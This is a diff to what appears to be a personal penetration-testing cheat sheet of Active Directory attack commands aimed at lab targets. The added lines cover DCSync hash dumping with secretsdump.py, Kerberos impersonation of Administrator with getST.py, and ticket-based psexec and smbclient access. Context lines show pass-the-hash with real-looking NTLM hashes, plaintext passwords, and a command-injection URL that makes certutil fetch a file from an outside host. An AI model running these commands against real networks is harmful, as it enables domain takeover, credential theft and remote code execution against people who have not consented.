@@ -79,6 +79,10 @@ ldapsearch -x -h 10.10.10.161 -D 'htb\svc-alfresco' -w 's3rvice' -b 'CN=Users,DC
 ([adsisearcher]"(&(objectCategory=person)(objectClass=user)(cn=Dan*))").findall().Properties.adspath.replace("LDAP://","")
 >> Get samaccountname
 ([adsisearcher]"(&(objectcategory=user)(userAccountControl:1.2.840.113556.1.4.803:=65536))").findall().Properties.samaccountname
+>> List domain admins
+Get-WmiObject -Class Win32_GroupUser | where-object {$_.GroupComponent -match "Domain Admins"} | foreach-object {[wmi]$_.PartComponent}
+>> More resources
+https://mlcsec.com/active-directory-domain-enumeration-part-2
 
 [ad-ldap-enum]
 ad-ldap-enum.py -l 10.10.10.10 -d domain.local
@@ -139,6 +143,12 @@ secretsdump.py -sam SAM -system SYSTEM LOCAL
 secretsdump.py -just-dc hololive.local/DC01\$@10.10.225.71
 >> DCSync
 secretsdump.py THROWBACK.local/jeffersd:Throwback2020@10.200.3.117 -dc-ip 10.200.3.117
+>> with ccache ticket
+export KRB5CCNAME=Administrator.ccache
+secretsdump.py -k DC.intelligence.htb -just-dc
+
+[Constrained Delegation: getst.py]
+getST.py intelligence.htb/svc_int\$ -hashes :47e89a6afd68e3872ef1acaf91d0b2f7 -impersonate Administrator -dc-ip 10.10.10.248 -spn 'WWW/dc.intelligence.htb'
 
 [xfreerdp]
 xfreerdp /v:10.10.10.10 /u:admin /p:password
@@ -223,6 +233,7 @@ http://172.31.1.24/?search=%00{.exec|certutil.exe%20-urlcache%20-f%20http://10.1
 [psexec]
 psexec.py -hashes LM:NTLM administrator@10.200.200.127
 psexec.py domain/username:password@10.10.10.10
+psexec.py -k intelligence.htb/administrator@dc.intelligence.htb -dc-ip 10.10.10.248 -target-ip 10.10.10.248 -no-pass
 
 [wmiexec]
 wmiexec.py -hashes LM:NTLM administrator@10.10.10.10
@@ -373,6 +384,7 @@ GetNPUsers.py roast.csl/ -dc-ip 10.10.10.10 -no-pass -usersfile users
 
 [smb with hash]
 smbclient.py -hashes aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 ADMIN.offshore.com/bankvault@172.16.4.31
+smbclient.py intelligence.htb/administrator@dc.intelligence.htb -dc-ip 10.10.10.248 -target-ip 10.10.10.248 -no-pass -k
 smbclient.py CORE.cyber.local/george.wirth:'v765>>QLm^8'@10.9.10.10 -dc-ip 10.9.10.10
 smbmap -H 172.16.4.31 -u bankvault -p aad3b435b51404eeaad3b435b51404ee:0ce1cb01ade331cdba32d0e1fba338a1 -d ADMIN.offshore.com
 
